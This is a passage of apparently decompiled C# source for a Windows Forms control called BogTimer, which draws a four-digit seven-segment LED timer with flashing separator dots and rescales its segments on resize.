		tmrShape obj51 = ur3;
		location = new Point(237, 25);
		((Control)obj51).set_Location(location);
		((Control)ur3).set_Name("ur3");
		ur3.ShapeColor = Color.DarkGray;
		ur3.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj52 = ur3;
		size = new Size(8, 40);
		((Control)obj52).set_Size(size);
		((Control)ur3).set_TabIndex(16);
		((Control)ur3).set_Tag((object)"3");
		tmrShape obj53 = ll3;
		location = new Point(197, 65);
		((Control)obj53).set_Location(location);
		((Control)ll3).set_Name("ll3");
		ll3.ShapeColor = Color.DarkGray;
		ll3.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj54 = ll3;
		size = new Size(8, 40);
		((Control)obj54).set_Size(size);
		((Control)ll3).set_TabIndex(15);
		((Control)ll3).set_Tag((object)"3");
		tmrShape obj55 = ul3;
		location = new Point(197, 25);
		((Control)obj55).set_Location(location);
		((Control)ul3).set_Name("ul3");
		ul3.ShapeColor = Color.DarkGray;
		ul3.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj56 = ul3;
		size = new Size(8, 40);
		((Control)obj56).set_Size(size);
		((Control)ul3).set_TabIndex(14);
		((Control)ul3).set_Tag((object)"3");
		tmrShape obj57 = f1;
		location = new Point(156, 33);
		((Control)obj57).set_Location(location);
		((Control)f1).set_Name("f1");
		f1.ShapeColor = Color.Maroon;
		f1.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj58 = f1;
		size = new Size(21, 24);
		((Control)obj58).set_Size(size);
		((Control)f1).set_TabIndex(28);
		((Control)f1).set_Tag((object)"f1");
		tmrShape obj59 = f2;
		location = new Point(155, 71);
		((Control)obj59).set_Location(location);
		((Control)f2).set_Name("f2");
		f2.ShapeColor = Color.Maroon;
		f2.ShapeDirection = tmrShape.tmrShapeDirection.Vertical;
		tmrShape obj60 = f2;
		size = new Size(21, 24);
		((Control)obj60).set_Size(size);
		((Control)f2).set_TabIndex(29);
		((Control)f2).set_Tag((object)"f2");
		((Control)this).set_BackColor(Color.Black);
		((Control)this).get_Controls().AddRange((Control[])(object)new Control[30]
		{
			(Control)f2,
			(Control)f1,
			(Control)bot4,
			(Control)top4,
			(Control)m4,
			(Control)lr4,
			(Control)ur4,
			(Control)ll4,
			(Control)ul4,
			(Control)bot3,
			(Control)top3,
			(Control)m3,
			(Control)lr3,
			(Control)ur3,
			(Control)ll3,
			(Control)ul3,
			(Control)bot2,
			(Control)top2,
			(Control)m2,
			(Control)lr2,
			(Control)ur2,
			(Control)ll2,
			(Control)ul2,
			(Control)bot1,
			(Control)top1,
			(Control)m1,
			(Control)lr1,
			(Control)ur1,
			(Control)ll1,
			(Control)ul1
		});
		((Control)this).set_Name("BogTimer");
		size = new Size(323, 128);
		((Control)this).set_Size(size);
		((Control)this).ResumeLayout(false);
	}

	private void SetFlash()
	{
		if (clsFlashOn)
		{
			f1.ShapeColor = clsLedOnColor;
			f2.ShapeColor = clsLedOnColor;
		}
		else
		{
			f1.ShapeColor = clsLedOffColor;
			f2.ShapeColor = clsLedOffColor;
		}
		clsFlashOn = !clsFlashOn;
		((Control)f1).Refresh();
		((Control)f2).Refresh();
	}

	private void UpdateShapes()
	{
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = ((Control)this).get_Controls().GetEnumerator();
			while (enumerator.MoveNext())
			{
				tmrShape tmrShape2 = (tmrShape)enumerator.Current;
				tmrShape2.ShapeColor = clsLedOffColor;
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
	}

	private void CalculateText(string Chr, int Pos)
	{
		tmrShape tmrShape2 = default(tmrShape);
		tmrShape tmrShape3 = default(tmrShape);
		tmrShape tmrShape4 = default(tmrShape);
		tmrShape tmrShape5 = default(tmrShape);
		tmrShape tmrShape6 = default(tmrShape);
		tmrShape tmrShape7 = default(tmrShape);
		tmrShape tmrShape8 = default(tmrShape);
		switch (Pos)
		{
		case 1:
			tmrShape2 = top1;
			tmrShape3 = ur1;
			tmrShape4 = ul1;
			tmrShape5 = m1;
			tmrShape6 = lr1;
			tmrShape7 = ll1;
			tmrShape8 = bot1;
			if (StringType.StrCmp(top1.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				top1.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ur1.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ur1.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ul1.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ul1.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(m1.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				m1.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(lr1.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				lr1.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ll1.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ll1.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(bot1.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				bot1.ShapeColor = clsLedOffColor;
			}
			break;
		case 2:
			tmrShape2 = top2;
			tmrShape3 = ur2;
			tmrShape4 = ul2;
			tmrShape5 = m2;
			tmrShape6 = lr2;
			tmrShape7 = ll2;
			tmrShape8 = bot2;
			if (StringType.StrCmp(top2.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				top2.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ur2.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ur2.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ul2.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ul2.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(m2.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				m2.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(lr2.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				lr2.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ll2.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ll2.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(bot2.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				bot2.ShapeColor = clsLedOffColor;
			}
			break;
		case 3:
			tmrShape2 = top3;
			tmrShape3 = ur3;
			tmrShape4 = ul3;
			tmrShape5 = m3;
			tmrShape6 = lr3;
			tmrShape7 = ll3;
			tmrShape8 = bot3;
			if (StringType.StrCmp(top3.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				top3.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ur3.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ur3.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ul3.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ul3.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(m3.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				m3.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(lr3.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				lr3.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ll3.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ll3.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(bot3.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				bot3.ShapeColor = clsLedOffColor;
			}
			break;
		case 4:
			tmrShape2 = top4;
			tmrShape3 = ur4;
			tmrShape4 = ul4;
			tmrShape5 = m4;
			tmrShape6 = lr4;
			tmrShape7 = ll4;
			tmrShape8 = bot4;
			if (StringType.StrCmp(top4.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				top4.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ur4.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ur4.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ul4.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ul4.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(m4.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				m4.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(lr4.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				lr4.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(ll4.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				ll4.ShapeColor = clsLedOffColor;
			}
			if (StringType.StrCmp(bot4.ShapeColor.ToString(), clsLedOffColor.ToString(), false) != 0)
			{
				bot4.ShapeColor = clsLedOffColor;
			}
			break;
		}
		if (StringType.StrCmp(Chr, StringType.FromInteger(0), false) == 0)
		{
			tmrShape3.ShapeColor = clsLedOnColor;
			tmrShape2.ShapeColor = clsLedOnColor;
			tmrShape4.ShapeColor = clsLedOnColor;
			tmrShape7.ShapeColor = clsLedOnColor;
			tmrShape6.ShapeColor = clsLedOnColor;
			tmrShape8.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(1), false) == 0)
		{
			tmrShape6.ShapeColor = clsLedOnColor;
			tmrShape3.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(2), false) == 0)
		{
			tmrShape2.ShapeColor = clsLedOnColor;
			tmrShape3.ShapeColor = clsLedOnColor;
			tmrShape5.ShapeColor = clsLedOnColor;
			tmrShape7.ShapeColor = clsLedOnColor;
			tmrShape8.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(3), false) == 0)
		{
			tmrShape2.ShapeColor = clsLedOnColor;
			tmrShape3.ShapeColor = clsLedOnColor;
			tmrShape5.ShapeColor = clsLedOnColor;
			tmrShape6.ShapeColor = clsLedOnColor;
			tmrShape8.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(4), false) == 0)
		{
			tmrShape3.ShapeColor = clsLedOnColor;
			tmrShape4.ShapeColor = clsLedOnColor;
			tmrShape5.ShapeColor = clsLedOnColor;
			tmrShape6.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(5), false) == 0)
		{
			tmrShape2.ShapeColor = clsLedOnColor;
			tmrShape4.ShapeColor = clsLedOnColor;
			tmrShape5.ShapeColor = clsLedOnColor;
			tmrShape6.ShapeColor = clsLedOnColor;
			tmrShape8.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(6), false) == 0)
		{
			tmrShape2.ShapeColor = clsLedOnColor;
			tmrShape4.ShapeColor = clsLedOnColor;
			tmrShape7.ShapeColor = clsLedOnColor;
			tmrShape8.ShapeColor = clsLedOnColor;
			tmrShape6.ShapeColor = clsLedOnColor;
			tmrShape5.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(7), false) == 0)
		{
			tmrShape2.ShapeColor = clsLedOnColor;
			tmrShape3.ShapeColor = clsLedOnColor;
			tmrShape6.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(8), false) == 0)
		{
			tmrShape2.ShapeColor = clsLedOnColor;
			tmrShape3.ShapeColor = clsLedOnColor;
			tmrShape4.ShapeColor = clsLedOnColor;
			tmrShape5.ShapeColor = clsLedOnColor;
			tmrShape7.ShapeColor = clsLedOnColor;
			tmrShape6.ShapeColor = clsLedOnColor;
			tmrShape8.ShapeColor = clsLedOnColor;
		}
		else if (StringType.StrCmp(Chr, StringType.FromInteger(9), false) == 0)
		{
			tmrShape2.ShapeColor = clsLedOnColor;
			tmrShape3.ShapeColor = clsLedOnColor;
			tmrShape6.ShapeColor = clsLedOnColor;
			tmrShape4.ShapeColor = clsLedOnColor;
			tmrShape5.ShapeColor = clsLedOnColor;
		}
		((Control)tmrShape2).Refresh();
		((Control)tmrShape3).Refresh();
		((Control)tmrShape4).Refresh();
		((Control)tmrShape5).Refresh();
		((Control)tmrShape6).Refresh();
		((Control)tmrShape7).Refresh();
		((Control)tmrShape8).Refresh();
		((Control)f1).Refresh();
		((Control)f2).Refresh();
	}

	private void BogTimer_Resize(object sender, EventArgs e)
	{
		double num = 6.0;
		checked
		{
			((Control)m1).set_Height((int)Math.Round((double)((Control)this).get_Height() / 3.0 * 0.12));
			((Control)m1).set_Top((int)Math.Round((double)((Control)this).get_Height() / 4.0 * 2.0 - (double)((Control)m1).get_Height() / 2.0));
			((Control)m1).set_Width((int)Math.Round((double)((Control)this).get_Width() / 8.0));
			((Control)ur1).set_Width((int)Math.Round((double)((Control)this).get_Width() / 3.0 * 0.08));
			((Control)f1).set_Height((int)Math.Round((double)((Control)this).get_Height() / 3.0 * 0.3));
			((Control)f1).set_Width((int)Math.Round((double)((Control)this).get_Width() / 20.0));
			((Control)f2).set_Height((int)Math.Round((double)((Control)this).get_Height() / 3.0 * 0.3));
			((Control)f2).set_Width((int)Math.Round((double)((Control)this).get_Width() / 20.0));
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((Control)this).get_Controls().GetEnumerator();
				while (enumerator.MoveNext())
				{
					tmrShape tmrShape2 = (tmrShape)enumerator.Current;
					if (Strings.InStr(((Control)tmrShape2).get_Name(), "f", (CompareMethod)0) == 0)
					{
						if (tmrShape2.ShapeDirection == tmrShape.tmrShapeDirection.Vertical)
						{
							if (Strings.InStr(((Control)tmrShape2).get_Name(), "u", (CompareMethod)0) != 0)
							{
								((Control)tmrShape2).set_Top((int)Math.Round((double)((Control)this).get_Height() / 4.0));
							}
							else
							{
								((Control)tmrShape2).set_Top((int)Math.Round((double)((Control)this).get_Height() / 2.0));
							}
							object tag = ((Control)tmrShape2).get_Tag();
							if (ObjectType.ObjTst(tag, (object)1, false) == 0)
							{
								if (Strings.InStr(((Control)tmrShape2).get_Name(), "r", (CompareMethod)0) != 0)
								{
									((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num + (double)((Control)m1).get_Width() - (double)((Control)m1).get_Width() / 2.0));
								}
								else
								{
									((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num - (double)((Control)m1).get_Width() / 2.0));
								}
							}
							else if (ObjectType.ObjTst(tag, (object)2, false) == 0)
							{
								if (Strings.InStr(((Control)tmrShape2).get_Name(), "r", (CompareMethod)0) != 0)
								{
									((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 2.0 + (double)((Control)m1).get_Width() - (double)((Control)m1).get_Width() / 2.0));
								}
								else
								{
									((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 2.0 - (double)((Control)m1).get_Width() / 2.0));
								}
							}
							else if (ObjectType.ObjTst(tag, (object)3, false) == 0)
							{
								if (Strings.InStr(((Control)tmrShape2).get_Name(), "r", (CompareMethod)0) != 0)
								{
									((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 3.0 + (double)((Control)m1).get_Width() + (double)((Control)m1).get_Width() / 2.0));
								}
								else
								{
									((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 3.0 + (double)((Control)m1).get_Width() / 2.0));
								}
							}
							else if (ObjectType.ObjTst(tag, (object)4, false) == 0)
							{
								if (Strings.InStr(((Control)tmrShape2).get_Name(), "r", (CompareMethod)0) != 0)
								{
									((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 4.0 + (double)((Control)m1).get_Width() + (double)((Control)m1).get_Width() / 2.0));
								}
								else
								{
									((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 4.0 + (double)((Control)m1).get_Width() / 2.0));
								}
							}
							((Control)tmrShape2).set_Height((int)Math.Round((double)((Control)this).get_Height() / 4.0));
							((Control)tmrShape2).set_Width((int)Math.Round((double)((Control)this).get_Width() / 3.0 * 0.08));
						}
						else
						{
							if (Strings.InStr(((Control)tmrShape2).get_Name(), "top", (CompareMethod)0) != 0)
							{
								((Control)tmrShape2).set_Top((int)Math.Round((double)((Control)this).get_Height() / 4.0 - (double)((Control)tmrShape2).get_Height() / 2.0));
							}
							else if (Strings.InStr(((Control)tmrShape2).get_Name(), "m", (CompareMethod)0) != 0)
							{
								((Control)tmrShape2).set_Top((int)Math.Round((double)((Control)this).get_Height() / 4.0 * 2.0 - (double)((Control)tmrShape2).get_Height() / 2.0));
							}
							else
							{
								((Control)tmrShape2).set_Top((int)Math.Round((double)((Control)this).get_Height() / 4.0 * 3.0 - (double)((Control)tmrShape2).get_Height() / 2.0));
							}
							object tag2 = ((Control)tmrShape2).get_Tag();
							if (ObjectType.ObjTst(tag2, (object)1, false) == 0)
							{
								((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num + (double)((Control)ur1).get_Width() / 2.0 - (double)((Control)m1).get_Width() / 2.0));
							}
							else if (ObjectType.ObjTst(tag2, (object)2, false) == 0)
							{
								((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 2.0 + (double)((Control)ur1).get_Width() / 2.0 - (double)((Control)m1).get_Width() / 2.0));
							}
							else if (ObjectType.ObjTst(tag2, (object)3, false) == 0)
							{
								((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 3.0 + (double)((Control)ur1).get_Width() / 2.0 + (double)((Control)m1).get_Width() / 2.0));
							}
							else if (ObjectType.ObjTst(tag2, (object)4, false) == 0)
							{
								((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / num * 4.0 + (double)((Control)ur1).get_Width() / 2.0 + (double)((Control)m1).get_Width() / 2.0));
							}
							((Control)tmrShape2).set_Height((int)Math.Round((double)((Control)this).get_Height() / 3.0 * 0.12));
							((Control)tmrShape2).set_Width((int)Math.Round((double)((Control)this).get_Width() / 8.0));
						}
					}
					else
					{
						if (StringType.StrCmp(((Control)tmrShape2).get_Name(), "f1", false) == 0)
						{
							((Control)tmrShape2).set_Top((int)Math.Round((double)((Control)m1).get_Top() + (double)((Control)m1).get_Height() / 2.0 - (double)((Control)tmrShape2).get_Height() - (double)((Control)m1).get_Height()));
						}
						else
						{
							((Control)tmrShape2).set_Top((int)Math.Round((double)((Control)m1).get_Top() + (double)((Control)m1).get_Height() / 2.0 + (double)((Control)m1).get_Height()));
						}
						((Control)tmrShape2).set_Left((int)Math.Round((double)((Control)this).get_Width() / 2.0 - (double)((Control)tmrShape2).get_Width() / 2.0));
						((Control)tmrShape2).set_Height((int)Math.Round((double)((Control)this).get_Height() / 3.0 * 0.3));
						((Control)tmrShape2).set_Width((int)Math.Round((double)((Control)this).get_Width() / 20.0));
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					((IDisposable)enumerator).Dispose();
				}
			}
			((Control)this).Refresh();
		}
	}
}
